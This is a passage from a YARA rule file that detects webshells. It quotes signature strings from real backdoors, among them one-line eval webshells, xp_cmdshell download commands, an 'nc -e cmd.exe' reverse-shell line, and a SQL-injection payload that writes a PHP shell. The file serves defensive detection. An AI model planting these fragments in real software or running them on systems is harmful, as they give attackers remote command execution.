	$s4 = "$aURL += array(\"scheme\" => \"\", \"host\" => \"\", \"path\" => \"\");" fullword ascii
condition:
	filesize < 4KB and all of them
}
rule Php_Webshell_f3_diy
{
strings:
	$s0 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
	$s5 = ".black {" fullword ascii
condition:
	uint16(0) == 0x253c and filesize < 10KB and all of them
}
rule Php_Webshell_ChinaChopper_temp
{
strings:
	$s0 = "o.run \"ff\",Server,Response,Request,Application,Session,Error" fullword ascii
	$s1 = "Set o = Server.CreateObject(\"ScriptControl\")" fullword ascii
	$s2 = "o.language = \"vbscript\"" fullword ascii
	$s3 = "o.addcode(Request(\"SC\"))" fullword ascii
condition:
	filesize < 1KB and all of them
}
rule Php_Webshell_Tools_2015
{
strings:
	$s0 = "Configbis = new BufferedInputStream(httpUrl.getInputStream());" fullword ascii
	$s4 = "System.out.println(Oute.toString());" fullword ascii
	$s5 = "String ConfigFile = Outpath + \"/\" + request.getParameter(\"ConFile\");" fullword ascii
	$s8 = "HttpURLConnection httpUrl = null;" fullword ascii
	$s19 = "Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;" fullword ascii
condition:
	filesize < 7KB and all of them
}
rule Php_Webshell_ChinaChopper_temp_2
{
strings:
	$s0 = "@eval($_POST[strtoupper(md5(gmdate(" ascii
condition:
	filesize < 150 and all of them
}
rule Php_Webshell_templatr
{
strings:
	$s0 = "eval(gzinflate(base64_decode('" ascii
condition:
	filesize < 70KB and all of them
}
rule Php_Webshell_reDuhServers_reDuh_3
{
strings:
	$s1 = "Response.Write(\"[Error]Unable to connect to reDuh.jsp main process on port \" +" ascii
	$s2 = "host = System.Net.Dns.Resolve(\"127.0.0.1\");" fullword ascii
	$s3 = "rw.WriteLine(\"[newData]\" + targetHost + \":\" + targetPort + \":\" + socketNum" ascii
	$s4 = "Response.Write(\"Error: Bad port or host or socketnumber for creating new socket" ascii
condition:
	filesize < 40KB and all of them
}
rule Php_Webshell_ChinaChopper_temp_3
{
strings:
	$s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"" ascii
	$s1 = "\"],\"unsafe\");%>" ascii
condition:
	uint16(0) == 0x253c and filesize < 150 and all of them
}
rule Asp_Webshell_Shell_Asp
{
strings:
	$s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
	$s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
	$s3 = "function Command(cmd, str){" fullword ascii
condition:
	filesize < 100KB and all of them
}
rule Asp_Webshell_Txt_aspxtag
{
strings:
	$s1 = "String wGetUrl=Request.QueryString[" fullword ascii
	$s2 = "sw.Write(wget);" fullword ascii
	$s3 = "Response.Write(\"Hi,Man 2015\"); " fullword ascii
condition:
	filesize < 2KB and all of them
}
rule Php_Webshell_Txt_php
{
strings:
	$s1 = "$Config=$_SERVER['QUERY_STRING'];" fullword ascii
	$s2 = "gzuncompress($_SESSION['api']),null);" ascii
	$s3 = "sprintf('%s?%s',pack(\"H*\"," ascii
	$s4 = "if(empty($_SESSION['api']))" fullword ascii
condition:
	filesize < 1KB and all of them
}
rule Asp_Webshell_Txt_aspx1
{
strings:
	$s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item["
	$s1 = "],\"unsafe\");%>" fullword ascii
condition:
	filesize < 150 and all of them
}
rule Php_Webshell_Txt_shell
{
strings:
	$s1 = "printf(\"Could not connect to remote shell!\\n\");" fullword ascii
	$s2 = "printf(\"Usage: %s <reflect ip> <port>\\n\", prog);" fullword ascii
	$s3 = "execl(shell,\"/bin/sh\",(char *)0);" fullword ascii
	$s4 = "char shell[]=\"/bin/sh\";" fullword ascii
	$s5 = "connect back door\\n\\n\");" fullword ascii
condition:
	filesize < 2KB and 2 of them
}
rule Asp_Webshell_Txt_asp
{
strings:
	$s1 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol" ascii
	$s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
condition:
	uint16(0) == 0x253c and filesize < 100KB and all of them
}
rule Asp_Webshell_Txt_asp1
{
strings:
	$s1 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
	$s2 = "autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)" fullword ascii
	$s3 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
	$s4 = "szTempFile = server.mappath(\"cmd.txt\")" fullword ascii
condition:
	filesize < 70KB and 2 of them
}
rule Php_Webshell_Txt_php_2
{
strings:
	$s1 = "function connect($dbhost, $dbuser, $dbpass, $dbname='') {" fullword ascii
	$s2 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
	$s3 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
	$s4 = "Powered by <a title=\"Build 20130112\" href=\"http://www.4ngel.net\" target=\"_b" ascii
	$s5 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this." ascii
	$s6 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
	$s7 = "secparam('Hosts', @file_get_contents('/etc/hosts'));" fullword ascii
	$s8 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=" ascii
condition:
	filesize < 100KB and 4 of them
}
rule Php_Webshell_Txt_ftp
{
strings:
	$s1 = "';exec master.dbo.xp_cmdshell 'echo open " ascii
	$s2 = "';exec master.dbo.xp_cmdshell 'ftp -s:';" ascii
	$s3 = "';exec master.dbo.xp_cmdshell 'echo get lcx.exe" ascii
	$s4 = "';exec master.dbo.xp_cmdshell 'echo get php.exe" ascii
	$s5 = "';exec master.dbo.xp_cmdshell 'copy " ascii
	$s6 = "ftp -s:d:\\ftp.txt " fullword ascii
	$s7 = "echo bye>>d:\\ftp.txt " fullword ascii
condition:
	filesize < 2KB and 2 of them
}
rule Php_Webshell_Txt_lcx
{
strings:
	$s1 = "printf(\"Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-l" ascii
	$s2 = "sprintf(tmpbuf2,\"\\r\\n########### reply from %s:%d ####################\\r\\n" ascii
	$s3 = "printf(\" 3: connect to HOST1:PORT1 and HOST2:PORT2\\r\\n\");" fullword ascii
	$s4 = "printf(\"got,ip:%s,port:%d\\r\\n\",inet_ntoa(client1.sin_addr),ntohs(client1.sin" ascii
	$s5 = "printf(\"[-] connect to host1 failed\\r\\n\");" fullword ascii
condition:
	filesize < 25KB and 2 of them
}
rule Jsp_Webshell_Txt_jspcmd
{
strings:
	$s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
	$s4 = "out.print(\"Hi,Man 2015\");" fullword ascii
condition:
	filesize < 1KB and 1 of them
}
rule Jsp_Webshell_Txt_jsp
{
strings:
	$s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
	$s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
	$s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
	$s4 = "cmd = \"cmd.exe /c set\";" fullword ascii
condition:
	filesize < 715KB and 2 of them
}
rule Asp_Webshell_Txt_aspxlcx
{
strings:
	$s1 = "public string remoteip = " ascii
	$s2 = "=Dns.Resolve(host);" ascii
	$s3 = "public string remoteport = " ascii
	$s4 = "public class PortForward" ascii
condition:
	uint16(0) == 0x253c and filesize < 18KB and all of them
}
rule Php_Webshell_Txt_xiao
{
strings:
	$s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
	$s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
	$s3 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED," ascii
	$s4 = "function Command(cmd, str){" fullword ascii
	$s5 = "echo \"if(obj.value=='PageWebProxy')obj.form.target='_blank';\"" fullword ascii
condition:
	filesize < 100KB and all of them
}
rule Asp_Webshell_Txt_aspx
{
strings:
	$s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
	$s2 = "Process[] p=Process.GetProcesses();" fullword ascii
	$s3 = "Copyright &copy; 2009 Bin" ascii
	$s4 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"serv" ascii
condition:
	filesize < 100KB and all of them
}
rule Php_Webshell_Txt_Sql
{
strings:
	$s1 = "cmd=chr(34)&\"cmd.exe /c \"&request.form(\"cmd\")&\" > 8617.tmp\"&chr(34)" fullword ascii
	$s2 = "strQuery=\"dbcc addextendedproc ('xp_regwrite','xpstar.dll')\"" fullword ascii
	$s3 = "strQuery = \"exec master.dbo.xp_cmdshell '\" & request.form(\"cmd\") & \"'\" " fullword ascii
	$s4 = "session(\"login\")=\"\"" fullword ascii
condition:
	filesize < 15KB and all of them
}
rule Php_Webshell_Txt_hello
{
strings:
	$s0 = "Dim myProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
	$s1 = "myProcessStartInfo.Arguments=\"/c \" & Cmd.text" fullword ascii
	$s2 = "myProcess.Start()" fullword ascii
	$s3 = "<p align=\"center\"><a href=\"?action=cmd\" target=\"_blank\">" fullword ascii
condition:
	filesize < 25KB and all of them
}
rule Php_Webshell_webshell_php_obfuscated_encoding
{
strings:
	$enc_eval1 = /(e|\\x65|\\101)(\\x76|\\118)(a|\\x61|\\97)(l|\\x6c|\\108)(\(|\\x28|\\40)/ ascii nocase
	$enc_eval2 = /(\\x65|\\101)(v|\\x76|\\118)(a|\\x61|\\97)(l|\\x6c|\\108)(\(|\\x28|\\40)/ ascii nocase
	$enc_assert1 = /(a|\\97|\\x61)(\\115|\\x73)(s|\\115|\\x73)(e|\\101|\\x65)(r|\\114|\\x72)(t|\\116|\\x74)(\(|\\x28|\\40)/ ascii nocase
	$enc_assert2 = /(\\97|\\x61)(s|\\115|\\x73)(s|\\115|\\x73)(e|\\101|\\x65)(r|\\114|\\x72)(t|\\116|\\x74)(\(|\\x28|\\40)/ ascii nocase
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/ ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
condition:
	filesize < 700KB and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and any of ( $enc* )
}
rule Php_Webshell_webshell_php_generic_eval
{
strings:
	$geval = /\b(exec|shell_exec|passthru|system|popen|proc_open|pcntl_exec|eval|assert)[\t ]*(\(base64_decode)?(\(stripslashes)?[\t ]*(\(trim)?[\t ]*\(\$(_POST|_GET|_REQUEST|_SERVER\s?\[['"]HTTP_|GLOBALS\[['"]_(POST|GET|REQUEST))/  ascii
	$gfp1 = "eval(\"return [$serialised_parameter" // elgg
	$gfp2 = "$this->assert(strpos($styles, $"
	$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
	$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
	$gfp5 = "$_POST[partition_by]($_POST["
	$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
	$gfp7 = "The above example code can be easily exploited by passing in a string such as" // ... ;)
	$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
	$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
	$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
	$gfp11 = "(eval (getenv \"EPROLOG\")))"
	$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
	$gfp_3 = " GET /"
	$gfp_4 = " POST /"
condition:
	filesize < 300KB and not ( any of ( $gfp* ) ) and $geval
}
rule Php_Webshell_webshell_php_generic_backticks
{
strings:
	$backtick = /`[\t ]*\$(_POST\[|_GET\[|_REQUEST\[|_SERVER\['HTTP_)/ ascii
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/  ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
condition:
	( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and $backtick and filesize < 200
}
rule Php_Webshell_webshell_php_by_string_known_webshell
{
strings:
	$pbs1 = "b374k shell" wide ascii
	$pbs2 = "b374k/b374k" wide ascii
	$pbs3 = "\"b374k" wide ascii
	$pbs4 = "$b374k(\"" wide ascii
	$pbs5 = "b374k " wide ascii
	$pbs6 = "0de664ecd2be02cdd54234a0d1229b43" wide ascii
	$pbs7 = "pwnshell" wide ascii
	$pbs8 = "reGeorg" fullword wide ascii
	$pbs9 = "Georg says, 'All seems fine" fullword wide ascii
	$pbs10 = "My PHP Shell - A very simple web shell" wide ascii
	$pbs11 = "<title>My PHP Shell <?echo VERSION" wide ascii
	$pbs12 = "F4ckTeam" fullword wide ascii
	$pbs15 = "MulCiShell" fullword wide ascii
	$pbs30 = "bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww" wide ascii
	$pbs35 = /@\$_GET\s?\[\d\]\)\.@\$_\(\$_GET\s?\[\d\]\)/  ascii
	$pbs36 = /@\$_GET\s?\[\d\]\)\.@\$_\(\$_POST\s?\[\d\]\)/  ascii
	$pbs37 = /@\$_POST\s?\[\d\]\)\.@\$_\(\$_GET\s?\[\d\]\)/  ascii
	$pbs38 = /@\$_POST\[\d\]\)\.@\$_\(\$_POST\[\d\]\)/  ascii
	$pbs39 = /@\$_REQUEST\[\d\]\)\.@\$_\(\$_REQUEST\[\d\]\)/  ascii
	$pbs42 = "array(\"find config.inc.php files\", \"find / -type f -name config.inc.php\")" wide ascii
	$pbs43 = "$_SERVER[\"\\x48\\x54\\x54\\x50" wide ascii
	$pbs52 = "preg_replace(\"/[checksql]/e\""
	$pbs53 = "='http://www.zjjv.com'"
	$pbs54 = "=\"http://www.zjjv.com\""
	$pbs60 = /setting\["AccountType"\]\s?=\s?3/
	$pbs61 = "~+d()\"^\"!{+{}"
	$pbs62 = "use function \\eval as "
	$pbs63 = "use function \\assert as "
	$front1 = "<?php eval(" nocase wide ascii
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/ ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
	$dex = { 64 65 ( 78 | 79 ) 0a 30 }
	$pack = { 50 41 43 4b 00 00 00 02 00 }
condition:
	filesize < 500KB and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and not ( uint16(0) == 0x5a4d or $dex at 0 or $pack at 0 or uint16(0) == 0x4b50 ) and ( any of ( $pbs* ) or $front1 in ( 0 .. 60 ) )
}
rule Php_Webshell_webshell_php_function_via_get
{
strings:
	$sr0 = /\$_GET\s?\[.{1,30}\]\(\$_GET\s?\[/  ascii
	$sr1 = /\$_POST\s?\[.{1,30}\]\(\$_GET\s?\[/  ascii
	$sr2 = /\$_POST\s?\[.{1,30}\]\(\$_POST\s?\[/  ascii
	$sr3 = /\$_GET\s?\[.{1,30}\]\(\$_POST\s?\[/  ascii
	$sr4 = /\$_REQUEST\s?\[.{1,30}\]\(\$_REQUEST\s?\[/  ascii
	$sr5 = /\$_SERVER\s?\[HTTP_.{1,30}\]\(\$_SERVER\s?\[HTTP_/  ascii
	$gfp1 = "eval(\"return [$serialised_parameter" // elgg
	$gfp2 = "$this->assert(strpos($styles, $"
	$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
	$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
	$gfp5 = "$_POST[partition_by]($_POST["
	$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
	$gfp7 = "The above example code can be easily exploited by passing in a string such as" // ... ;)
	$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
	$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
	$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
	$gfp11 = "(eval (getenv \"EPROLOG\")))"
	$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
condition:
	filesize < 500KB and not ( any of ( $gfp* ) ) and any of ( $sr* )
}
rule Php_Webshell_webshell_php_obfuscated_encoding_mixed_dec_and_hex
{
strings:
	$mix = /['"](\w|\\x?[0-9a-f]{2,3})[\\x0-9a-f]{2,20}\\\d{1,3}[\\x0-9a-f]{2,20}\\x[0-9a-f]{2}\\/ ascii nocase
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/ ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
condition:
	filesize < 700KB and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and any of ( $mix* )
}
rule Php_Webshell_webshell_php_base64_encoded_payloads
{
strings:
	$decode1 = "base64_decode" fullword nocase wide ascii
	$decode2 = "openssl_decrypt" fullword nocase wide ascii
	$one1 = "leGVj"
	$one2 = "V4ZW"
	$one3 = "ZXhlY"
	$one4 = "UAeABlAGMA"
	$one5 = "lAHgAZQBjA"
	$one6 = "ZQB4AGUAYw"
	$two1 = "zaGVsbF9leGVj"
	$two2 = "NoZWxsX2V4ZW"
	$two3 = "c2hlbGxfZXhlY"
	$two4 = "MAaABlAGwAbABfAGUAeABlAGMA"
	$two5 = "zAGgAZQBsAGwAXwBlAHgAZQBjA"
	$two6 = "cwBoAGUAbABsAF8AZQB4AGUAYw"
	$three1 = "wYXNzdGhyd"
	$three2 = "Bhc3N0aHJ1"
	$three3 = "cGFzc3Rocn"
	$three4 = "AAYQBzAHMAdABoAHIAdQ"
	$three5 = "wAGEAcwBzAHQAaAByAHUA"
	$three6 = "cABhAHMAcwB0AGgAcgB1A"
	$four1 = "zeXN0ZW"
	$four2 = "N5c3Rlb"
	$four3 = "c3lzdGVt"
	$four4 = "MAeQBzAHQAZQBtA"
	$four5 = "zAHkAcwB0AGUAbQ"
	$four6 = "cwB5AHMAdABlAG0A"
	$five1 = "wb3Blb"
	$five2 = "BvcGVu"
	$five3 = "cG9wZW"
	$five4 = "AAbwBwAGUAbg"
	$five5 = "wAG8AcABlAG4A"
	$five6 = "cABvAHAAZQBuA"
	$six1 = "wcm9jX29wZW"
	$six2 = "Byb2Nfb3Blb"
	$six3 = "cHJvY19vcGVu"
	$six4 = "AAcgBvAGMAXwBvAHAAZQBuA"
	$six5 = "wAHIAbwBjAF8AbwBwAGUAbg"
	$six6 = "cAByAG8AYwBfAG8AcABlAG4A"
	$seven1 = "wY250bF9leGVj"
	$seven2 = "BjbnRsX2V4ZW"
	$seven3 = "cGNudGxfZXhlY"
	$seven4 = "AAYwBuAHQAbABfAGUAeABlAGMA"
	$seven5 = "wAGMAbgB0AGwAXwBlAHgAZQBjA"
	$seven6 = "cABjAG4AdABsAF8AZQB4AGUAYw"
	$eight1 = "ldmFs"
	$eight2 = "V2YW"
	$eight3 = "ZXZhb"
	$eight4 = "UAdgBhAGwA"
	$eight5 = "lAHYAYQBsA"
	$eight6 = "ZQB2AGEAbA"
	$nine1 = "hc3Nlcn"
	$nine2 = "Fzc2Vyd"
	$nine3 = "YXNzZXJ0"
	$nine4 = "EAcwBzAGUAcgB0A"
	$nine5 = "hAHMAcwBlAHIAdA"
	$nine6 = "YQBzAHMAZQByAHQA"
	$execu1 = "leGVjd"
	$execu2 = "V4ZWN1"
	$execu3 = "ZXhlY3"
	$esystem1 = "lc3lzdGVt"
	$esystem2 = "VzeXN0ZW"
	$esystem3 = "ZXN5c3Rlb"
	$opening1 = "vcGVuaW5n"
	$opening2 = "9wZW5pbm"
condition:
	any of ( $decode* ) and ( ( any of ( $one* ) and not any of ( $execu* ) ) or any of ( $two* ) or any of ( $three* ) or ( any of ( $four* ) and not any of ( $esystem* ) ) or ( any of ( $five* ) and not any of ( $opening* ) ) or any of ( $six* ) or any of ( $seven* ) or any of ( $eight* ) or any of ( $nine* ) )
}
rule Asp_Webshell_WEBSHELL_ASPX_XslTransform_Aug21
{
strings:
	$csharpshell = "Language=\"C#\"" nocase
	$x1 = "<root>1</root>"
	$x2 = ".LoadXml(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("
	$s1 = "XsltSettings.TrustedXslt"
	$s2 = "Xml.XmlUrlResolver"
	$s3 = "FromBase64String(Request[\""
condition:
	filesize < 500KB and $csharpshell and (1 of ($x*) or all of ($s*))
}
rule Php_Webshell_CN_Honker_Webshell_PHP_php5
{
strings:
	$s0 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user" ascii /* PEStudio Blacklist: strings */
	$s20 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$" ascii /* PEStudio Blacklist: strings */
condition:
	uint16(0) == 0x3f3c and filesize < 300KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_test3693
{
strings:
	$s0 = "Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - " ascii /* PEStudio Blacklist: strings */
condition:
	uint16(0) == 0x4b50 and filesize < 50KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_mycode12
{
strings:
	$s1 = "<cfexecute name=\"cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "<cfoutput>#cmd#</cfoutput>" fullword ascii
condition:
	filesize < 4KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_offlibrary
{
strings:
	$s0 = "';$i=$g->query(\"SELECT SUBSTRING_INDEX(CURRENT_USER, '@', 1) AS User, SUBSTRING" ascii /* PEStudio Blacklist: strings */
	$s12 = "if(jushRoot){var script=document.createElement('script');script.src=jushRoot+'ju" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 1005KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_cfm_xl
{
strings:
	$s0 = "<input name=\"DESTINATION\" value=\"" ascii /* PEStudio Blacklist: strings */
	$s1 = "<CFFILE ACTION=\"Write\" FILE=\"#Form.path#\" OUTPUT=\"#Form.cmd#\">" fullword ascii
condition:
	uint16(0) == 0x433c and filesize < 13KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_PHP_linux
{
strings:
	$s0 = "<form name=form1 action=exploit.php method=post>" fullword ascii /* PEStudio Blacklist: strings */
	$s1 = "<title>Changing CHMOD Permissions Exploit " fullword ascii
condition:
	uint16(0) == 0x696c and filesize < 6KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_Interception3389_get
{
strings:
	$s0 = "userip = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")" fullword ascii /* PEStudio Blacklist: strings */
	$s1 = "file.writeline  szTime + \" HostName:\" + szhostname + \" IP:\" + userip+\":\"+n" ascii /* PEStudio Blacklist: strings */
	$s3 = "set file=fs.OpenTextFile(server.MapPath(\"WinlogonHack.txt\"),8,True)" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 3KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_nc_1
{
strings:
	$s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 " ascii /* PEStudio Blacklist: agent */
	$s2 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
condition:
	filesize < 11KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_PHP_BlackSky
{
strings:
	$s0 = "eval(gzinflate(base64_decode('" ascii /* PEStudio Blacklist: strings */
	$s1 = "B1ac7Sky-->" fullword ascii
condition:
	filesize < 641KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASP_asp3
{
strings:
	$s1 = "if shellpath=\"\" then shellpath = \"cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", Tru" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 444KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASPX_sniff
{
strings:
	$s1 = "IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 91KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_udf_udf
{
strings:
	$s1 = "<?php // Source  My : Meiam  " fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 430KB and all of them
}
rule Jsp_Webshell_CN_Honker_Webshell_JSP_jsp
{
strings:
	$s1 = "<input name=f size=30 value=shell.jsp>" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "<font color=red>www.i0day.com  By:" fullword ascii
condition:
	filesize < 3KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_T00ls_Lpk_Sethc_v4_mail
{
strings:
	$s1 = "if (!$this->smtp_putcmd(\"AUTH LOGIN\", base64_encode($this->user)))" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "$this->smtp_debug(\"> \".$cmd.\"\\n\");" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 39KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_phpwebbackup
{
strings:
	$s0 = "<?php // Code By isosky www.nbst.org" fullword ascii
	$s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii /* PEStudio Blacklist: strings */
condition:
	uint16(0) == 0x3f3c and filesize < 67KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_dz_phpcms_phpbb
{
strings:
	$s1 = "if($pwd == md5(md5($password).$salt))" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "function test_1($password)" fullword ascii /* PEStudio Blacklist: strings */
	$s3 = ":\".$pwd.\"\\n---------------------------------\\n\";exit;" fullword ascii
	$s4 = ":user=\".$user.\"\\n\";echo \"pwd=\".$pwd.\"\\n\";echo \"salt=\".$salt.\"\\n\";" fullword ascii
condition:
	filesize < 22KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_picloaked_1
{
strings:
	$s0 = "<?php eval($_POST[" ascii /* PEStudio Blacklist: strings */
	$s1 = ";<%execute(request(" ascii /* PEStudio Blacklist: strings */
	$s3 = "GIF89a" fullword ascii /* Goodware String - occured 318 times */
condition:
	filesize < 6KB and 2 of them
}
rule Php_Webshell_CN_Honker_Webshell_assembly
{
strings:
	$s0 = "response.write oScriptlhn.exec(\"cmd.exe /c\" & request(\"c\")).stdout.readall" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 1KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_PHP_php8
{
strings:
	$s0 = "<a href=\"http://hi.baidu.com/ca3tie1/home\" target=\"_blank\">Ca3tie1's Blog</a" ascii /* PEStudio Blacklist: strings */
	$s1 = "function startfile($path = 'dodo.zip')" fullword ascii /* PEStudio Blacklist: strings */
	$s3 = "<form name=\"myform\" method=\"post\" action=\"\">" fullword ascii /* PEStudio Blacklist: strings */
	$s5 = "$_REQUEST[zipname] = \"dodozip.zip\"; " fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 25KB and 2 of them
}
rule Php_Webshell_CN_Honker_Webshell_Tuoku_script_xx
{
strings:
	$s0 = "$mysql.=\"insert into `$table`($keys) values($vals);\\r\\n\";" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "$mysql_link=@mysql_connect($mysql_servername , $mysql_username , $mysql_password" ascii /* PEStudio Blacklist: strings */
	$s16 = "mysql_query(\"SET NAMES gbk\");" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 2KB and all of them
}
rule Jsp_Webshell_CN_Honker_Webshell_JSPMSSQL
{
strings:
	$s1 = "<form action=\"?action=operator&cmd=execute\"" fullword ascii /* PEStudio Blacklist: strings */
